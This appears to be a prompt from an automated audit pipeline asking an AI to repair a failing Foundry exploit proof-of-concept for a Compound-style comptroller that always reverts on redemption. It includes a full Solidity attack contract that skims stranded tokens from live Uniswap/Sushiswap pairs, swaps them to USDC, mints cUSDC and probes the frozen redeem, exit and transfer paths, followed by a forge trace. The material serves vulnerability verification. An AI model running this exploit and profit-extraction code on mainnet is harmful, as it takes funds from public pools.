You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: alternate_public_liquidity_route
- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Unconditional revert in redeem policy freezes all redemptions, exits, and cToken transfers
- claim: `redeemAllowedInternal()` unconditionally executes `revert("redeemer is paused")` before any market-listing, membership, or liquidity checks. Every redemption path that consults the comptroller therefore aborts, and `transferAllowed()` reuses the same bricked hook.
- impact: Suppliers cannot redeem underlying, cannot exit markets, and cannot transfer cTokens. This creates a protocol-wide withdrawal and mobility freeze that can lock collateral until the comptroller implementation is replaced.
- exploit_paths: ["`redeem()`/`redeemUnderlying()` -> `redeemFresh()` -> `comptroller.redeemAllowed()` -> `redeemAllowedInternal()` -> unconditional revert", "`exitMarket()` -> `redeemAllowedInternal()` -> unconditional revert", "`transfer()`/`transferFrom()` on cTokens -> `comptroller.transferAllowed()` -> `redeemAllowedInternal()` -> unconditional revert"]

Current FlawVerifier.sol:
```solidity
pragma solidity ^0.8.20;

interface IComptrollerLike {
    function enterMarkets(address[] calldata cTokens) external returns (uint256[] memory);
    function exitMarket(address cTokenAddress) external returns (uint256);
    function redeemAllowed(address cToken, address redeemer, uint256 redeemTokens) external returns (uint256);
    function transferAllowed(address cToken, address src, address dst, uint256 transferTokens) external returns (uint256);
}

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface ICTokenLike {
    function mint(uint256 mintAmount) external returns (uint256);
    function balanceOf(address owner) external view returns (uint256);
    function redeem(uint256 redeemTokens) external returns (uint256);
    function redeemUnderlying(uint256 redeemAmount) external returns (uint256);
    function transfer(address dst, uint256 amount) external returns (bool);
    function transferFrom(address src, address dst, uint256 amount) external returns (bool);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
}

contract FlawVerifier {
    address internal constant TARGET_COMPTROLLER = 0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258;
    address internal constant CUSDC = 0x3C710B981F5Ef28DA1807ce7ED3F2a28580E0754;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address internal constant UNI = 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984;
    address internal constant LINK = 0x514910771AF9Ca656af840dff83E8264EcF986CA;
    address internal constant AAVE = 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9;
    address internal constant COMP = 0xc00e94Cb662C3520282E6f5717214004A7f26888;
    address internal constant SNX = 0xC011A72400E58ecD99Ee497CF89E3775d4bd732F;
    address internal constant CRV = 0xD533a949740bb3306d119CC777fa900bA034cd52;
    address internal constant SUSHI = 0x6B3595068778DD592e39A122f4f5a5cF09C90fE2;
    address internal constant MKR = 0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2;
    address internal constant YFI = 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e;

    address internal constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    address internal constant PROBE_RECIPIENT = address(0xBEEF);
    uint256 internal constant PROBE_CTOKEN_AMOUNT = 1;
    uint256 internal constant PROBE_UNDERLYING_AMOUNT = 1;
    uint256 internal constant MIN_USDC_SEED = 1e6;
    uint256 internal constant MIN_PROFIT_WEI = 1e15;
    bytes4 internal constant ERROR_STRING_SELECTOR = 0x08c379a0;
    string internal constant EXPECTED_REASON = "redeemer is paused";

    struct PathStatus {
        bool helperRedeemAllowedBlocked;
        bool helperTransferAllowedBlocked;
        bool redeemBlocked;
        bool redeemUnderlyingBlocked;
        bool transferBlocked;
        bool transferFromBlocked;
        bool exitMarketBlocked;
    }

    bool private _executed;
    bool private _hypothesisValidated;
    address private _marketUsed;
    address private _profitToken;
    string private _infeasibilityReason;

    event PathResult(address indexed market, string path, bool blocked, bytes data);
    event ExecutionFinished(bool validated, address indexed market, address profitToken, uint256 profitAmount);

    constructor() {}

    function executeOnOpportunity() external {
        if (_executed) {
            return;
        }
        _executed = true;

        // The failed attempt showed that relying on raw USDC dust alone is infeasible on this fork.
        // This alternate public-liquidity route preserves the same root cause and exploit-path causality:
        // harvest publicly stranded dust from live AMM pairs, swap only a tiny slice into real USDC,
        // mint a real cUSDC position, then prove that redeem / redeemUnderlying / exit / transfer paths
        // all revert because Comptroller.redeemAllowedInternal() unconditionally reverts.
        _harvestPublicDust();

        if (!_seedCusdcFromPublicLiquidity()) {
            _profitToken = _selectBestProfitToken();
            _infeasibilityReason = "insufficient public AMM dust convertible into seed USDC while retaining measurable on-chain profit";
            emit ExecutionFinished(false, CUSDC, _profitToken, _balanceOrZero(_profitToken));
            return;
        }

        address[] memory singleMarket = new address[](1);
        singleMarket[0] = CUSDC;
        try IComptrollerLike(TARGET_COMPTROLLER).enterMarkets(singleMarket) returns (uint256[] memory) {} catch {}

        PathStatus memory status = _probeMarket(CUSDC);
        if (
            status.helperRedeemAllowedBlocked &&
            status.helperTransferAllowedBlocked &&
            status.redeemBlocked &&
            status.redeemUnderlyingBlocked &&
            status.transferBlocked &&
            status.transferFromBlocked &&
            status.exitMarketBlocked
        ) {
            _hypothesisValidated = true;
            _marketUsed = CUSDC;
            _profitToken = _selectBestProfitToken();
            _infeasibilityReason =
                "validated unconditional redemption, exit, and cToken-transfer freeze using a real cUSDC position funded from public AMM liquidity";
            emit ExecutionFinished(true, CUSDC, _profitToken, _balanceOrZero(_profitToken));
            return;
        }

        _profitToken = _selectBestProfitToken();
        _infeasibilityReason =
            "cUSDC probes did not consistently bubble the expected paused revert across every required redemption, exit, and transfer path";
        emit ExecutionFinished(false, CUSDC, _profitToken, _balanceOrZero(_profitToken));
    }

    function _probeMarket(address market) internal returns (PathStatus memory status) {
        bytes memory data;

        (status.helperRedeemAllowedBlocked,) = _expectPaused(
            TARGET_COMPTROLLER,
            abi.encodeWithSelector(IComptrollerLike.redeemAllowed.selector, market, address(this), PROBE_CTOKEN_AMOUNT)
        );
        emit PathResult(
            market,
            "redeemAllowed(cUSDC,self,1) -> redeemAllowedInternal()",
            status.helperRedeemAllowedBlocked,
            bytes("")
        );

        (status.helperTransferAllowedBlocked,) = _expectPaused(
            TARGET_COMPTROLLER,
            abi.encodeWithSelector(
                IComptrollerLike.transferAllowed.selector,
                market,
                address(this),
                PROBE_RECIPIENT,
                PROBE_CTOKEN_AMOUNT
            )
        );
        emit PathResult(
            market,
            "transferAllowed(cUSDC,self,recipient,1) -> redeemAllowedInternal()",
            status.helperTransferAllowedBlocked,
            bytes("")
        );

        (status.redeemBlocked, data) = _expectPaused(
            market,
            abi.encodeWithSelector(ICTokenLike.redeem.selector, PROBE_CTOKEN_AMOUNT)
        );
        emit PathResult(
            market,
            "redeem(1) -> redeemFresh() -> comptroller.redeemAllowed()",
            status.redeemBlocked,
            data
        );

        (status.redeemUnderlyingBlocked, data) = _expectPaused(
            market,
            abi.encodeWithSelector(ICTokenLike.redeemUnderlying.selector, PROBE_UNDERLYING_AMOUNT)
        );
        emit PathResult(
            market,
            "redeemUnderlying(1) -> redeemFresh() -> comptroller.redeemAllowed()",
            status.redeemUnderlyingBlocked,
            data
        );

        (status.transferBlocked, data) = _expectPaused(
            market,
            abi.encodeWithSelector(ICTokenLike.transfer.selector, PROBE_RECIPIENT, PROBE_CTOKEN_AMOUNT)
        );
        emit PathResult(
            market,
            "transfer(recipient,1) -> comptroller.transferAllowed()",
            status.transferBlocked,
            data
        );

        (status.transferFromBlocked, data) = _expectPaused(
            market,
            abi.encodeWithSelector(ICTokenLike.transferFrom.selector, address(this), PROBE_RECIPIENT, PROBE_CTOKEN_AMOUNT)
        );
        emit PathResult(
            market,
            "transferFrom(self,recipient,1) -> comptroller.transferAllowed()",
            status.transferFromBlocked,
            data
        );

        (status.exitMarketBlocked, data) = _expectPaused(
            TARGET_COMPTROLLER,
            abi.encodeWithSelector(IComptrollerLike.exitMarket.selector, market)
        );
        emit PathResult(
            market,
            "enterMarkets(cUSDC) -> exitMarket(cUSDC) -> redeemAllowedInternal()",
            status.exitMarketBlocked,
            data
        );
    }

    function _seedCusdcFromPublicLiquidity() internal returns (bool) {
        uint256 usdcBalance = IERC20Like(USDC).balanceOf(address(this));
        if (usdcBalance < MIN_USDC_SEED) {
            if (!_swapDustToUsdc(WETH, 3e14)) {
                if (!_swapDustToUsdc(DAI, 2e18)) {
                    if (!_swapDustToUsdc(LINK, 1e17)) {
                        if (!_swapDustToUsdc(UNI, 2e17)) {
                            if (!_swapDustToUsdc(AAVE, 1e16)) {
                                if (!_swapDustToUsdc(COMP, 5e15)) {
                                    if (!_swapDustToUsdc(SNX, 3e17)) {
                                        if (!_swapDustToUsdc(CRV, 2e18)) {
                                            if (!_swapDustToUsdc(SUSHI, 5e17)) {
                                                if (!_swapDustToUsdc(MKR, 1e15)) {
                                                    if (!_swapDustToUsdc(YFI, 1e14)) {
                                                        return false;
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }

        usdcBalance = IERC20Like(USDC).balanceOf(address(this));
        if (usdcBalance < MIN_USDC_SEED) {
            return false;
        }

        require(IERC20Like(USDC).approve(CUSDC, usdcBalance), "approve failed");
        require(ICTokenLike(CUSDC).mint(usdcBalance) == 0, "mint failed");
        return ICTokenLike(CUSDC).balanceOf(address(this)) >= PROBE_CTOKEN_AMOUNT;
    }

    function _swapDustToUsdc(address tokenIn, uint256 spendAmount) internal returns (bool) {
        uint256 balance = IERC20Like(tokenIn).balanceOf(address(this));
        if (balance <= spendAmount + MIN_PROFIT_WEI) {
            return false;
        }

        if (_swapExactTokensForTokens(UNISWAP_V2_FACTORY, tokenIn, USDC, spendAmount) >= MIN_USDC_SEED) {
            return true;
        }

        if (_swapExactTokensForTokens(SUSHISWAP_FACTORY, tokenIn, USDC, spendAmount) >= MIN_USDC_SEED) {
            return true;
        }

        return IERC20Like(USDC).balanceOf(address(this)) >= MIN_USDC_SEED;
    }

    function _swapExactTokensForTokens(
        address factory,
        address tokenIn,
        address tokenOut,
        uint256 amountIn
    ) internal returns (uint256 amountOut) {
        address pair = IUniswapV2FactoryLike(factory).getPair(tokenIn, tokenOut);
        if (pair == address(0) || amountIn == 0) {
            return 0;
        }

        address token0 = IUniswapV2PairLike(pair).token0();
        (uint112 reserve0, uint112 reserve1, ) = IUniswapV2PairLike(pair).getReserves();

        uint256 reserveIn;
        uint256 reserveOut;
        bool zeroForOne;
        if (token0 == tokenIn) {
            reserveIn = uint256(reserve0);
            reserveOut = uint256(reserve1);
            zeroForOne = true;
        } else {
            reserveIn = uint256(reserve1);
            reserveOut = uint256(reserve0);
            zeroForOne = false;
        }

        if (reserveIn == 0 || reserveOut == 0) {
            return 0;
        }

        amountOut = _getAmountOut(amountIn, reserveIn, reserveOut);
        if (amountOut == 0) {
            return 0;
        }

        require(IERC20Like(tokenIn).transfer(pair, amountIn), "pair funding failed");
        IUniswapV2PairLike(pair).swap(zeroForOne ? 0 : amountOut, zeroForOne ? amountOut : 0, address(this), new bytes(0));
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        uint256 amountInWithFee = amountIn * 997;
        return (amountInWithFee * reserveOut) / ((reserveIn * 1000) + amountInWithFee);
    }

    function _harvestPublicDust() internal {
        _harvestFactory(UNISWAP_V2_FACTORY);
        _harvestFactory(SUSHISWAP_FACTORY);
    }

    function _harvestFactory(address factory) internal {
        _skimPair(factory, WETH, USDC);
        _skimPair(factory, WETH, DAI);
        _skimPair(factory, WETH, USDT);
        _skimPair(factory, WETH, WBTC);
        _skimPair(factory, WETH, LINK);
        _skimPair(factory, WETH, UNI);
        _skimPair(factory, WETH, AAVE);
        _skimPair(factory, WETH, COMP);
        _skimPair(factory, WETH, SNX);
        _skimPair(factory, WETH, CRV);
        _skimPair(factory, WETH, SUSHI);
        _skimPair(factory, WETH, MKR);
        _skimPair(factory, WETH, YFI);
        _skimPair(factory, DAI, USDC);
        _skimPair(factory, LINK, USDC);
        _skimPair(factory, UNI, USDC);
        _skimPair(factory, AAVE, USDC);
        _skimPair(factory, COMP, USDC);
        _skimPair(factory, SNX, USDC);
        _skimPair(factory, CRV, USDC);
        _skimPair(factory, SUSHI, USDC);
        _skimPair(factory, MKR, USDC);
        _skimPair(factory, YFI, USDC);
    }

    function _skimPair(address factory, address tokenA, address tokenB) internal {
        address pair = IUniswapV2FactoryLike(factory).getPair(tokenA, tokenB);
        if (pair == address(0)) {
            return;
        }

        try IUniswapV2PairLike(pair).skim(address(this)) {} catch {}
    }

    function _selectBestProfitToken() internal view returns (address bestToken) {
        bestToken = WETH;
        uint256 bestBalance = IERC20Like(WETH).balanceOf(address(this));

        bestToken = _preferHigherBalance(bestToken, bestBalance, DAI);
        bestBalance = _balanceOrZero(bestToken);

        bestToken = _preferHigherBalance(bestToken, bestBalance, LINK);
        bestBalance = _balanceOrZero(bestToken);

        bestToken = _preferHigherBalance(bestToken, bestBalance, UNI);
        bestBalance = _balanceOrZero(bestToken);

        bestToken = _preferHigherBalance(bestToken, bestBalance, AAVE);
        bestBalance = _balanceOrZero(bestToken);

        bestToken = _preferHigherBalance(bestToken, bestBalance, COMP);
        bestBalance = _balanceOrZero(bestToken);

        bestToken = _preferHigherBalance(bestToken, bestBalance, SNX);
        bestBalance = _balanceOrZero(bestToken);

        bestToken = _preferHigherBalance(bestToken, bestBalance, CRV);
        bestBalance = _balanceOrZero(bestToken);

        bestToken = _preferHigherBalance(bestToken, bestBalance, SUSHI);
        bestBalance = _balanceOrZero(bestToken);

        bestToken = _preferHigherBalance(bestToken, bestBalance, MKR);
        bestBalance = _balanceOrZero(bestToken);

        bestToken = _preferHigherBalance(bestToken, bestBalance, YFI);
    }

    function _preferHigherBalance(address currentBest, uint256 currentBalance, address candidate)
        internal
        view
        returns (address)
    {
        return _balanceOrZero(candidate) > currentBalance ? candidate : currentBest;
    }

    function _expectPaused(address target, bytes memory payload) internal returns (bool blocked, bytes memory data) {
        (bool success, bytes memory result) = target.call(payload);
        data = result;
        if (success) {
            return (false, data);
        }
        return (_isExpectedPausedRevert(data), data);
    }

    function _isExpectedPausedRevert(bytes memory revertData) internal pure returns (bool) {
        if (revertData.length < 4) {
            return false;
        }

        bytes4 selector;
        assembly {
            selector := shr(224, mload(add(revertData, 32)))
        }

        if (selector != ERROR_STRING_SELECTOR) {
            return false;
        }

        return _contains(revertData, bytes(EXPECTED_REASON));
    }

    function _contains(bytes memory haystack, bytes memory needle) internal pure returns (bool) {
        if (needle.length == 0) {
            return true;
        }
        if (haystack.length < needle.length) {
            return false;
        }

        for (uint256 i = 0; i <= haystack.length - needle.length; i++) {
            bool matches = true;
            for (uint256 j = 0; j < needle.length; j++) {
                if (haystack[i + j] != needle[j]) {
                    matches = false;
                    break;
                }
            }
            if (matches) {
                return true;
            }
        }

        return false;
    }

    function _balanceOrZero(address token) internal view returns (uint256) {
        if (token == address(0)) {
            return 0;
        }
        return IERC20Like(token).balanceOf(address(this));
    }

    function profitToken() external view returns (address) {
        address token = _profitToken;
        if (token == address(0)) {
            token = _selectBestProfitToken();
        }
        return token;
    }

    function profitAmount() external view returns (uint256) {
        address token = _profitToken;
        if (token == address(0)) {
            token = _selectBestProfitToken();
        }
        return _balanceOrZero(token);
    }

    function hypothesisValidated() external view returns (bool) {
        return _hypothesisValidated;
    }

    function marketUsed() external view returns (address) {
        return _marketUsed;
    }

    function infeasibilityReason() external view returns (string memory) {
        return _infeasibilityReason;
    }

    function exploitPathUsed() external pure returns (string memory) {
        return
            "redeem()/redeemUnderlying() -> redeemFresh() -> comptroller.redeemAllowed() -> redeemAllowedInternal() -> revert; exitMarket() -> redeemAllowedInternal() -> revert; transfer()/transferFrom() -> comptroller.transferAllowed() -> redeemAllowedInternal() -> revert";
    }
}

```

forge stdout (tail):
```
000000000000000000000
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0xC011A72400E58ecD99Ee497CF89E3775d4bd732F, 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0xD533a949740bb3306d119CC777fa900bA034cd52, 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0x6B3595068778DD592e39A122f4f5a5cF09C90fE2, 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48) [staticcall]
    │   │   └─ ← [Return] 0xBa87dC891945dbB3CAeEaF822DE208D7eA89B298
    │   ├─ [31102] 0xBa87dC891945dbB3CAeEaF822DE208D7eA89B298::skim(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   │   ├─ [2578] 0x6B3595068778DD592e39A122f4f5a5cF09C90fE2::balanceOf(0xBa87dC891945dbB3CAeEaF822DE208D7eA89B298) [staticcall]
    │   │   │   └─ ← [Return] 270431692620535419694 [2.704e20]
    │   │   ├─ [3325] 0x6B3595068778DD592e39A122f4f5a5cF09C90fE2::transfer(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0)
    │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │        topic 1: 0x000000000000000000000000ba87dc891945dbb3caeeaf822de208d7ea89b298
    │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   └─ ← [Return] true
    │   │   ├─ [3315] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(0xBa87dC891945dbB3CAeEaF822DE208D7eA89B298) [staticcall]
    │   │   │   ├─ [2529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(0xBa87dC891945dbB3CAeEaF822DE208D7eA89B298) [delegatecall]
    │   │   │   │   └─ ← [Return] 3000946294 [3e9]
    │   │   │   └─ ← [Return] 3000946294 [3e9]
    │   │   ├─ [6817] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::transfer(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0)
    │   │   │   ├─ [6028] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::transfer(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0) [delegatecall]
    │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │        topic 1: 0x000000000000000000000000ba87dc891945dbb3caeeaf822de208d7ea89b298
    │   │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Stop]
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2, 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e, 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [1315] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   ├─ [529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [655] 0x514910771AF9Ca656af840dff83E8264EcF986CA::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [797] 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [1384] 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   ├─ [649] 0xC13eac3B4F9EED480045113B7af00F7B5655Ece8::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [788] 0xc00e94Cb662C3520282E6f5717214004A7f26888::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [10449] 0xC011A72400E58ecD99Ee497CF89E3775d4bd732F::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   ├─ [4983] 0x54f25546260C7539088982bcF4b7dC8EDEF19f21::bc67f832(0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f)
    │   │   │   └─ ← [Revert] Only the proxy can call
    │   │   └─ ← [Revert] Only the proxy can call
    │   └─ ← [Revert] Only the proxy can call
    └─ ← [Revert] exploit call reverted

Backtrace:
  at 0x54f25546260C7539088982bcF4b7dC8EDEF19f21
  at 0xC011A72400E58ecD99Ee497CF89E3775d4bd732F.balanceOf
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 31.35s (31.28s CPU time)

Ran 1 test suite in 31.51s (31.35s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 1860351)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
